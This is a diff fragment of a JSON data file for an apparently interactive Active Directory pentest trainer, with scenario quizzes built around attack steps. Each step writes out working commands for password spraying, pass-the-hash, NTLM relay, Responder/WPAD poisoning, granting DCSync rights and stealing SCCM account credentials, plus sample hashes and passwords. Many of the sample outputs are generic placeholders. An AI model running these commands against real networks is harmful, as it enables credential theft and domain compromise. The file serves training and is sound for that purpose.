+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "PtH reuse mapped."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Use --local-auth for a dumped local Administrator hash.",
+            "demo": [
+              {
+                "run": "nxc smb {{subnet}} -u {{user}} -p '{{password}}' --local-auth",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Local-account reuse mapped."
+          }
+        ]
+      },
+      "situation": "Scenario: Spray a validated credential across the subnet. Which move should you run next?",
+      "choices": [
+        "cred-reuse-sweep",
+        "kerberos-spn-fix",
+        "relay-target-signing",
+        "responder-tune"
+      ],
+      "coach": {
+        "kerberos-spn-fix": "Kerberos 'Principal Unknown' - Fix the Name/SPN targets nothing attack-wise; it gets the kdc to recognise the principal so your kerberos request works; here the direct move is Credential-Reuse Sweep (Where Am I Admin?).",
+        "relay-target-signing": "Relay Blocked by SMB Signing - Pick a Signing-Off Target targets nothing attack-wise; it redirects the relay to a host where it will actually land; here the direct move is Credential-Reuse Sweep (Where Am I Admin?).",
+        "responder-tune": "Responder Catching Nothing - Turn Its Servers On targets nothing attack-wise; it makes responder actually capture the auth it poisons; here the direct move is Credential-Reuse Sweep (Where Am I Admin?)."
+      }
+    },
+    "kerberos-spn-fix": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once kerberos needs the NAME, never the IP. The key confirmation is: Kerberos resolves the name.",
+      "cmd": "echo '{{target}} {{dc_fqdn}} {{domain}}' | sudo tee -a /etc/hosts; getent hosts {{dc_fqdn}}",
+      "tool": "sh",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Kerberos resolves the name.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Kerberos 'Principal Unknown' - Fix the Name/SPN, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Put the DC FQDN in /etc/hosts and address it by name.",
+            "demo": [
+              {
+                "run": "echo '{{target}} {{dc_fqdn}} {{domain}}' | sudo tee -a /etc/hosts; getent hosts {{dc_fqdn}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Kerberos resolves the name."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "A wrong or absent SPN. Re-list the SPNs and copy the exact one.",
+            "demo": [
+              {
+                "run": "nxc ldap {{dc_fqdn}} -u {{user}} -p {{password}} --kerberoasting out.txt   # confirm the SPN exists",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The right SPN makes it work."
+          }
+        ]
+      },
+      "situation": "Scenario: Kerberos needs the NAME, never the IP. Which move should you run next?",
+      "choices": [
+        "kerberos-spn-fix",
+        "relay-target-signing",
+        "responder-tune",
+        "fix-clock-skew"
+      ],
+      "coach": {
+        "relay-target-signing": "Relay Blocked by SMB Signing - Pick a Signing-Off Target targets nothing attack-wise; it redirects the relay to a host where it will actually land; here the direct move is Kerberos 'Principal Unknown' - Fix the Name/SPN.",
+        "responder-tune": "Responder Catching Nothing - Turn Its Servers On targets nothing attack-wise; it makes responder actually capture the auth it poisons; here the direct move is Kerberos 'Principal Unknown' - Fix the Name/SPN.",
+        "fix-clock-skew": "Kerberos Clock Skew - Sync and Retry targets a credential that authenticates over kerberos once the clock is synced to the dc; here the direct move is Kerberos 'Principal Unknown' - Fix the Name/SPN."
+      }
+    },
+    "relay-target-signing": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once the relay is blocked by SMB signing. The key confirmation is: A relay target list is built.",
+      "cmd": "nxc smb {{subnet}} --gen-relay-list relay_targets.txt",
+      "tool": "nxc",
+      "output": "SMB  10.10.10.10  445  SRV01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV01) (domain:acme.internal) (signing:False) (SMBv1:False)",
+      "signal": "signing:False",
+      "teach": "A relay target list is built.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Relay Blocked by SMB Signing - Pick a Signing-Off Target, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Sweep the subnet and write every host with signing OFF to a file.",
+            "demo": [
+              {
+                "run": "nxc smb {{subnet}} --gen-relay-list relay_targets.txt",
+                "out": "SMB  10.10.10.10  445  SRV01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV01) (domain:acme.internal) (signing:False) (SMBv1:False)",
+                "sig": "signing:False"
+              }
+            ],
+            "note": "A relay target list is built."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Target the signing-off hosts, not the signing-required one.",
+            "demo": [
+              {
+                "run": "impacket-ntlmrelayx -tf relay_targets.txt -smb2support",
+                "out": "[SMB] NTLMv2-SSP Client   : 10.10.10.20\n[SMB] NTLMv2-SSP Username : ACME\\svc_backup\n[SMB] NTLMv2-SSP Hash     : svc_backup::ACME:1122334455667788:a9b8c7d6e5f40123456789abcdef0123:0101000000000000",
+                "sig": "NTLMv2-SSP Hash"
+              }
+            ],
+            "note": "The relay has a valid target."
+          }
+        ]
+      },
+      "situation": "Scenario: The relay is blocked by SMB signing. Which move should you run next?",
+      "choices": [
+        "relay-target-signing",
+        "kerberos-spn-fix",
+        "responder-tune",
+        "fix-clock-skew"
+      ],
+      "coach": {
+        "kerberos-spn-fix": "Kerberos 'Principal Unknown' - Fix the Name/SPN targets nothing attack-wise; it gets the kdc to recognise the principal so your kerberos request works; here the direct move is Relay Blocked by SMB Signing - Pick a Signing-Off Target.",
+        "responder-tune": "Responder Catching Nothing - Turn Its Servers On targets nothing attack-wise; it makes responder actually capture the auth it poisons; here the direct move is Relay Blocked by SMB Signing - Pick a Signing-Off Target.",
+        "fix-clock-skew": "Kerberos Clock Skew - Sync and Retry targets a credential that authenticates over kerberos once the clock is synced to the dc; here the direct move is Relay Blocked by SMB Signing - Pick a Signing-Off Target."
+      }
+    },
+    "responder-tune": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once responder is catching nothing. The key confirmation is: Responder is set up to capture.",
+      "cmd": "sudo ss -tlnp | grep -E ':445|:80 '; grep -E 'SMB|HTTP' /etc/responder/Responder.conf",
+      "tool": "sh",
+      "output": "[SMB] NTLMv2-SSP Client   : 10.10.10.20\n[SMB] NTLMv2-SSP Username : ACME\\svc_backup\n[SMB] NTLMv2-SSP Hash     : svc_backup::ACME:1122334455667788:a9b8c7d6e5f40123456789abcdef0123:0101000000000000",
+      "signal": "NTLMv2-SSP Hash",
+      "teach": "Responder is set up to capture.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Responder Catching Nothing - Turn Its Servers On, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Check nothing else holds 445 or 80 (stop a running smbd or apache2) and that SMB and HTTP are On in the conf.",
+            "demo": [
+              {
+                "run": "sudo ss -tlnp | grep -E ':445|:80 '; grep -E 'SMB|HTTP' /etc/responder/Responder.conf",
+                "out": "[SMB] NTLMv2-SSP Client   : 10.10.10.20\n[SMB] NTLMv2-SSP Username : ACME\\svc_backup\n[SMB] NTLMv2-SSP Hash     : svc_backup::ACME:1122334455667788:a9b8c7d6e5f40123456789abcdef0123:0101000000000000",
+                "sig": "NTLMv2-SSP Hash"
+              }
+            ],
+            "note": "Responder is set up to capture."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "-w enables WPAD. Hashes land as victims authenticate.",
+            "demo": [
+              {
+                "run": "sudo responder -I {{iface}} -wv",
+                "out": "[SMB] NTLMv2-SSP Client   : 10.10.10.20\n[SMB] NTLMv2-SSP Username : ACME\\svc_backup\n[SMB] NTLMv2-SSP Hash     : svc_backup::ACME:1122334455667788:a9b8c7d6e5f40123456789abcdef0123:0101000000000000",
+                "sig": "NTLMv2-SSP Hash"
+              }
+            ],
+            "note": "Captures start flowing."
+          }
+        ]
+      },
+      "situation": "Scenario: Responder is catching nothing. Which move should you run next?",
+      "choices": [
+        "responder-tune",
+        "kerberos-spn-fix",
+        "relay-target-signing",
+        "fix-clock-skew"
+      ],
+      "coach": {
+        "kerberos-spn-fix": "Kerberos 'Principal Unknown' - Fix the Name/SPN targets nothing attack-wise; it gets the kdc to recognise the principal so your kerberos request works; here the direct move is Responder Catching Nothing - Turn Its Servers On.",
+        "relay-target-signing": "Relay Blocked by SMB Signing - Pick a Signing-Off Target targets nothing attack-wise; it redirects the relay to a host where it will actually land; here the direct move is Responder Catching Nothing - Turn Its Servers On.",
+        "fix-clock-skew": "Kerberos Clock Skew - Sync and Retry targets a credential that authenticates over kerberos once the clock is synced to the dc; here the direct move is Responder Catching Nothing - Turn Its Servers On."
+      }
+    },
+    "fix-clock-skew": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once kDC_ERR_SKEW: sync your clock to the DC. The key confirmation is: The skew is gone.",
+      "cmd": "sudo ntpdate {{target}}",
+      "tool": "ntpdate",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "The skew is gone.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Kerberos Clock Skew - Sync and Retry, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Sync, then immediately re-run the failing command.",
+            "demo": [
+              {
+                "run": "sudo ntpdate {{target}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The skew is gone."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "rdate -n does the same over TCP.",
+            "demo": [
+              {
+                "run": "sudo rdate -n {{target}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The clock matches via rdate."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Wrap just the one command with a faketime offset.",
+            "demo": [
+              {
+                "run": "faketime -f '+Ns' {{kerberos_command}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "A per-command time fix."
+          }
+        ]
+      },
+      "situation": "Scenario: KDC_ERR_SKEW: sync your clock to the DC. Which move should you run next?",
+      "choices": [
+        "fix-clock-skew",
+        "kerberos-spn-fix",
+        "relay-target-signing",
+        "responder-tune"
+      ],
+      "coach": {
+        "kerberos-spn-fix": "Kerberos 'Principal Unknown' - Fix the Name/SPN targets nothing attack-wise; it gets the kdc to recognise the principal so your kerberos request works; here the direct move is Kerberos Clock Skew - Sync and Retry.",
+        "relay-target-signing": "Relay Blocked by SMB Signing - Pick a Signing-Off Target targets nothing attack-wise; it redirects the relay to a host where it will actually land; here the direct move is Kerberos Clock Skew - Sync and Retry.",
+        "responder-tune": "Responder Catching Nothing - Turn Its Servers On targets nothing attack-wise; it makes responder actually capture the auth it poisons; here the direct move is Kerberos Clock Skew - Sync and Retry."
+      }
+    },
+    "fix-acl-reauth": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once the grant was denied: confirm the membership first. The key confirmation is: The add stuck, so the problem is a stale session token.",
+      "cmd": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get object \"{{user}}\" --attr memberOf",
+      "tool": "bloodyad",
+      "output": "[+] Dacl modification successful! Principal bob now holds FullControl / DCSync rights.",
+      "signal": "Dacl modification successful",
+      "teach": "The add stuck, so the problem is a stale session token.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute ACL Write Denied: Re-Authenticate After the Grant, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "The memberOf list should show the group you just joined.",
+            "demo": [
+              {
+                "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get object \"{{user}}\" --attr memberOf",
+                "out": "[+] Dacl modification successful! Principal bob now holds FullControl / DCSync rights.",
+                "sig": "Dacl modification successful"
+              }
+            ],
+            "note": "The add stuck, so the problem is a stale session token."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Clear it so the next command authenticates fresh.",
+            "demo": [
+              {
+                "run": "kdestroy -A 2>/dev/null; unset KRB5CCNAME",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The next auth will carry the new membership."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "The DS-Replication ACEs are written now that the membership is in the token.",
+            "demo": [
+              {
+                "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add dcsync {{user}}",
+                "out": "[+] Dacl modification successful! Principal bob now holds FullControl / DCSync rights.",
+                "sig": "Dacl modification successful"
+              }
+            ],
+            "note": "You hold DCSync, run the dump next."
+          }
+        ]
+      },
+      "situation": "Scenario: The grant was denied: confirm the membership first. Which move should you run next?",
+      "choices": [
+        "fix-acl-reauth",
+        "kerberos-spn-fix",
+        "relay-target-signing",
+        "responder-tune"
+      ],
+      "coach": {
+        "kerberos-spn-fix": "Kerberos 'Principal Unknown' - Fix the Name/SPN targets nothing attack-wise; it gets the kdc to recognise the principal so your kerberos request works; here the direct move is ACL Write Denied: Re-Authenticate After the Grant.",
+        "relay-target-signing": "Relay Blocked by SMB Signing - Pick a Signing-Off Target targets nothing attack-wise; it redirects the relay to a host where it will actually land; here the direct move is ACL Write Denied: Re-Authenticate After the Grant.",
+        "responder-tune": "Responder Catching Nothing - Turn Its Servers On targets nothing attack-wise; it makes responder actually capture the auth it poisons; here the direct move is ACL Write Denied: Re-Authenticate After the Grant."
+      }
+    },
+    "account-password-change": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once an expired password you still want to use. The key confirmation is: The account is usable with the new password.",
+      "cmd": "smbpasswd -r {{target}} -U {{user}}",
+      "tool": "smbpasswd",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "The account is usable with the new password.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Change an Expired Password to Use It, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Prompts for the old (expired) and new password over SMB. No admin needed.",
+            "demo": [
+              {
+                "run": "smbpasswd -r {{target}} -U {{user}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The account is usable with the new password."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Supports -p rpc-samr or -p kpasswd when SMB is filtered.",
+            "demo": [
+              {
+                "run": "impacket-changepasswd {{domain}}/{{user}}@{{target}} -newpass {{newpass}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "A changed password via impacket."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "When the above are blocked.",
+            "demo": [
+              {
+                "run": "rpcclient -U {{user}}%{{password}} {{target}} -c \"setuserinfo2 {{user}} 23 {{newpass}}\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "A changed password via rpcclient."
+          }
+        ]
+      },
+      "situation": "Scenario: An expired password you still want to use. Which move should you run next?",
+      "choices": [
+        "account-password-change",
+        "kerberos-spn-fix",
+        "relay-target-signing",
+        "responder-tune"
+      ],
+      "coach": {
+        "kerberos-spn-fix": "Kerberos 'Principal Unknown' - Fix the Name/SPN targets nothing attack-wise; it gets the kdc to recognise the principal so your kerberos request works; here the direct move is Change an Expired Password to Use It.",
+        "relay-target-signing": "Relay Blocked by SMB Signing - Pick a Signing-Off Target targets nothing attack-wise; it redirects the relay to a host where it will actually land; here the direct move is Change an Expired Password to Use It.",
+        "responder-tune": "Responder Catching Nothing - Turn Its Servers On targets nothing attack-wise; it makes responder actually capture the auth it poisons; here the direct move is Change an Expired Password to Use It."
+      }
+    },
+    "ntlm-disabled-kerberos": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once nTLM is disabled: switch to Kerberos. The key confirmation is: Kerberos auth works where NTLM is off.",
+      "cmd": "nxc smb {{dc_fqdn}} -u {{user}} -p {{password}} -k",
+      "tool": "nxc",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Kerberos auth works where NTLM is off.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute NTLM Disabled - Switch to Kerberos, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Add -k and use the DC FQDN (put it in /etc/hosts first).",
+            "demo": [
+              {
+                "run": "nxc smb {{dc_fqdn}} -u {{user}} -p {{password}} -k",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Kerberos auth works where NTLM is off."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Grab a TGT once, then -k -no-pass across the impacket suite.",
+            "demo": [
+              {
+                "run": "impacket-getTGT {{domain}}/{{user}}:{{password}} && export KRB5CCNAME={{user}}.ccache",
+                "out": "Impacket v0.11.0\n[*] Saving ticket in bob.ccache",
+                "sig": ".ccache"
+              }
+            ],
+            "note": "One TGT reused everywhere."
+          }
+        ]
+      },
+      "situation": "Scenario: NTLM is disabled: switch to Kerberos. Which move should you run next?",
+      "choices": [
+        "ntlm-disabled-kerberos",
+        "kerberos-spn-fix",
+        "relay-target-signing",
+        "responder-tune"
+      ],
+      "coach": {
+        "kerberos-spn-fix": "Kerberos 'Principal Unknown' - Fix the Name/SPN targets nothing attack-wise; it gets the kdc to recognise the principal so your kerberos request works; here the direct move is NTLM Disabled - Switch to Kerberos.",
+        "relay-target-signing": "Relay Blocked by SMB Signing - Pick a Signing-Off Target targets nothing attack-wise; it redirects the relay to a host where it will actually land; here the direct move is NTLM Disabled - Switch to Kerberos.",
+        "responder-tune": "Responder Catching Nothing - Turn Its Servers On targets nothing attack-wise; it makes responder actually capture the auth it poisons; here the direct move is NTLM Disabled - Switch to Kerberos."
+      }
+    },
+    "auth-account-blocked": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once lOCKOUT. The key confirmation is: You stop before locking more accounts.",
+      "cmd": "nxc smb {{dc}} -u {{user}} -p {{password}} --pass-pol",
+      "tool": "nxc",
+      "output": "[+]Minimum password length: 7\n[+]Password history length: 24\n[+]Account lockout threshold: 5\n[+]Observation window: 30 minutes",
+      "signal": "Account lockout threshold: 5",
+      "teach": "You stop before locking more accounts.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Account Locked or Restricted - What Now, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Read the lockout policy (threshold and window). Stop spraying and wait out the window.",
+            "demo": [
+              {
+                "run": "nxc smb {{dc}} -u {{user}} -p {{password}} --pass-pol",
+                "out": "[+]Minimum password length: 7\n[+]Password history length: 24\n[+]Account lockout threshold: 5\n[+]Observation window: 30 minutes",
+                "sig": "Account lockout threshold: 5"
+              }
+            ],
+            "note": "You stop before locking more accounts."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "The account may be disabled (UAC flag 2), expired, or denied this logon type. Try a different logon (WinRM vs SMB).",
+            "demo": [
+              {
+                "run": "nxc ldap {{dc}} -u {{user}} -p {{password}} --query \"(userAccountControl:1.2.840.113556.1.4.803:=2)\" \"\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "You identify why the account is blocked."
+          }
+        ]
+      },
+      "situation": "Scenario: LOCKOUT. Which move should you run next?",
+      "choices": [
+        "auth-account-blocked",
+        "kerberos-spn-fix",
+        "relay-target-signing",
+        "responder-tune"
+      ],
+      "coach": {
+        "kerberos-spn-fix": "Kerberos 'Principal Unknown' - Fix the Name/SPN targets nothing attack-wise; it gets the kdc to recognise the principal so your kerberos request works; here the direct move is Account Locked or Restricted - What Now.",
+        "relay-target-signing": "Relay Blocked by SMB Signing - Pick a Signing-Off Target targets nothing attack-wise; it redirects the relay to a host where it will actually land; here the direct move is Account Locked or Restricted - What Now.",
+        "responder-tune": "Responder Catching Nothing - Turn Its Servers On targets nothing attack-wise; it makes responder actually capture the auth it poisons; here the direct move is Account Locked or Restricted - What Now."
+      }
+    },
+    "sccm-exploit": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once map the SMS provider and site. The key confirmation is: The SCCM site is mapped.",
+      "cmd": "SharpSCCM.exe get naa",
+      "tool": "SharpSCCM",
+      "output": "[+] Retrieved Network Access Account credential:\n    Username: ACME\\svc_sccm\n    Password: SCCMNaaP@ss2024",
+      "signal": "Username: ACME\\svc_sccm",
+      "teach": "The NAA is a real domain account (svc_sccm) you can now use. Validate it, then feed it into the credential loop, it often has access the account you started with did not.",
+      "leadup": [
+        {
+          "key": "cred",
+          "label": "You hold a domain credential",
+          "steps": [
+            {
+              "title": "You are authenticated",
+              "tool": "nxc",
+              "where": "local",
+              "cmd": "nxc smb {{target}} -u {{user}} -p {{password}}",
+              "out": "SMB  10.10.10.10  445  DC01  [+] acme.internal\\bob:Spring2024",
+              "sig": "[+] acme.internal\\bob",
+              "teach": "Any valid domain account can read the NAA from a management point, you do not need admin."
+            }
+          ]
+        },
+        {
+          "key": "site",
+          "label": "sccmhunter found a management point",
+          "steps": [
+            {
+              "title": "Map the SCCM site",
+              "tool": "sccmhunter",
+              "where": "local",
+              "cmd": "sccmhunter.py find -u {{user}} -p {{password}} -d {{domain}} -dc-ip {{target}}",
+              "out": "[+] Found management point: MP01.acme.internal\n[+] Site code: ACM",
+              "sig": "Found management point",
+              "teach": "A management point plus a site code is all SharpSCCM needs to request the NAA."
+            }
+          ]
+        }
